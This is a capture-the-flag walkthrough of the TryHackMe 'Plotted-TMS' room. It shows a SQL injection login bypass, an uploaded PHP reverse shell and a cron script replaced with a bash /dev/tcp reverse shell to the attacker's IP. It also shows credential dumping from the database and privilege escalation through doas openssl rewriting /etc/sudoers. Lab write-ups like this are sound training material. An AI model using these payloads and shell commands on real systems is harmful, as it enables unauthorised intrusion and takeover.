# Plotted-TMS
URL: https://tryhackme.com/room/plottedtms
Difficulty: Easy

# enumeration

As usual let's start out with an nmap scan to see what we have got to work with.

<img width="936" height="541" alt="image" src="https://github.com/user-attachments/assets/24d006fb-53bd-481a-9dfd-794fa8fc0104" />

So we see that we have 3 ports open, 22 SSH, 80 HTTP, and 445. But it doesn't seem to be SMB. It looks like there is another HTTP-server running on that port instead. So SSH and 2 HTTP.

Since it seems a little off having an HTTTP server on 445. Let's start with that one. Might be able to find something interesting. So let's see what we can find with gobuster.

```gobuster dir -u http://<target_ip>:445 -w /usr/share/wordlists/dirb/big.txt -t 40 -x php,txt,js,py```

<img width="855" height="550" alt="image" src="https://github.com/user-attachments/assets/8ddd3fef-8f45-49cf-8595-1bad9eba70f9" />

Management sounds kinda fun, doesn't it? With some further enumeration we find a few more directories.

<img width="803" height="241" alt="image" src="https://github.com/user-attachments/assets/f8abaf1b-09c8-45dc-8d0b-ca1259a84a51" />

As I kept enumerating and just trying to see what I could find, I stumbled upon dist/js/script.js

<img width="1522" height="495" alt="image" src="https://github.com/user-attachments/assets/d3615665-4479-4e03-bb02-bc0ed80c7ecc" />

This part caught my attention for a bit. So I tried accessing classes/Login.php?f=login to see what it might show me.

<img width="679" height="37" alt="image" src="https://github.com/user-attachments/assets/a73472bc-cea6-4ebe-be19-9587705fdb6e" />

Awesome! It showed me a whole lot of interesting information. Now I knew that I was dealing with a LAMP-stack and I knew how the SQL queries were constructed. This is something I can work with.
So let's try logging into the admin page with a simple SQLi.

```admin' and 1=1;#'```

<img width="360" height="182" alt="image" src="https://github.com/user-attachments/assets/f62c32aa-98ba-403e-820a-7516f35fa000" />

And we're in.

<img width="1920" height="354" alt="image" src="https://github.com/user-attachments/assets/059c5ddc-881b-4876-8756-7e0d9b9ef1c6" />

# getting a shell
So now we have overcome the first hurdle. Now we'll need to see if we're able to find a way to get a shell on the server.
Looking around a bit we find, under settings, that you seem to be able to upload images to use as background for the login screen. File upload and php... I smell something nice!
<img width="1608" height="665" alt="image" src="https://github.com/user-attachments/assets/112d50bd-3bde-4031-9143-4326aea6a658" />

Time to bust out the good old php-reverse-shell.php from pentestmonkey. After changing the adress and port it points to we'll try uploading it, and start a netcat listener.

```nc -lnvp 1337```

<img width="1604" height="676" alt="image" src="https://github.com/user-attachments/assets/ae53cc0b-a21b-456b-a669-992de10991e0" />

No error message, let's see if we got a shell in our listener.

<img width="893" height="189" alt="image" src="https://github.com/user-attachments/assets/8abf855a-7158-4893-8bcd-58453836c5da" />

Success!

# escalating to user
Now that we've got a shell. We should be trying to find a way to take control of a user account to get the user flag.
First of all, let's see what the username is that we should focus on. And upgrading it to a tty.

```cat /etc/passwd```

```python3 -c 'import pty;pty.spawn("/bin/bash")'```

I figured since it was a LAMP stack, there are probably going to be some credentials saved for the webserver to query the SQL database.

<img width="1584" height="176" alt="image" src="https://github.com/user-attachments/assets/0767623a-c4c9-4a55-81ed-057930369714" />

There they are! Trying the password to log on to plot_admin doesn't work. So we'll need to dig deeper. We'll check out the database to see if there are more users of interest in it.

```mysql -u tms_user -p```

<img width="1417" height="478" alt="image" src="https://github.com/user-attachments/assets/77d01ecc-f049-4d3b-abc5-e48f865a6125" />

I used hashcat to crack the hash for puser and tried that as the password for the user account. But that didn't work either. So this was a dead end.

Let's see if we can find any interesting SUID-binaries then.

```find / -perm /4000 2>/dev/null```

<img width="311" height="101" alt="image" src="https://github.com/user-attachments/assets/b1e63db9-e89f-491c-b2c6-d6026042665c" />

Hmmm... doas is something I don't recognise. Looking into it I found this:
https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#doas
So if we check the doas.conf file we'll see how I might be exploited.

```cat /etc/doas.conf```

<img width="380" height="34" alt="image" src="https://github.com/user-attachments/assets/7bc58ae2-1f4c-4ed6-afc0-70f252dadc6b" />

So that didn't really get us anywhere, right now. It seems as though plot_admin is able to run openssl without a password as root. But we still need to get a hold of plot_admin.

Now then what else can we check? Time's ticking... Time? Time-based? Cron? Let's see if we can find a cronjob perhaps.

```cat /etc/crontab```

<img width="834" height="384" alt="image" src="https://github.com/user-attachments/assets/5ff1527a-5b38-43ba-8303-47dd82273245" />

Nice! We have a cronjob for a backup.sh which runs as plot_admin. What does it do?

<img width="575" height="189" alt="image" src="https://github.com/user-attachments/assets/5c135484-2f06-48d2-92e2-df6df19273ad" />

What it does, doesn't really seem that interesting. But hey, look at that. Who owns the directory? We do as www-data. That means that even though the script is owned by plot_admin.
We can replace it with our own.

```
cd var/www/scripts
mv backup.sh backup.sh.old
echo "#!/bin/bash" > backup.sh
echo "/bin/bash -i >& /dev/tcp/10.9.245.105/1338 0>&1" >> backup.sh
chmod +x backup.sh
```

Now that we have our own script, which has the same name and is executable. We just need to play the waiting game.

<img width="662" height="182" alt="image" src="https://github.com/user-attachments/assets/131e8cc9-1166-4273-91b7-14ab55ee58d2" />

Tada! Now we can just read the user.txt file and we'll be on our way to escalate to root.

```cat user.txt```

# getting root
So if you remember from before, we found out that plot_admin was able to run openssl as root through doas. How are we going to leverage this?
Well, let's see what we can find out from gtfobins.
https://gtfobins.github.io/gtfobins/openssl/
Apparently we should be able to get a root shell through making a new reverse shell through it. This didn't work for me, so let's skip that and go for another option.
Let's give ourselves the privilege to run anything with sudo without a password. Since we can both read and write as root with openssl.
We'll start with making a copy of the current sudoers file. So that we can restore it to a good version later.

```doas openssl enc -in /etc/sudoers```

<img width="828" height="516" alt="image" src="https://github.com/user-attachments/assets/06ac2c36-a5fe-4782-ad9b-151b7879d808" />

We added a line for our user there at the end. Now let's overwrite the file on the server to give us the privileges.

<img width="816" height="266" alt="image" src="https://github.com/user-attachments/assets/cc3bb913-be13-48a9-86c4-bb3c0e464587" />

There we go! Now we have root! Let's just restore the sudoers file to working condition, by downloading it from our attacker PC.

```
Attacker:
python3 -m http.server 8080
Target:
cd /etc
rm sudoers
wget http://10.9.245.105:8080/sudoers
```

<img width="828" height="812" alt="image" src="https://github.com/user-attachments/assets/9f2ac570-1126-47b9-9651-26fd9914991a" />

Perfect! A good looking sudoers file. Now we'll just get the root flag as well.

```cat /root/root.txt```
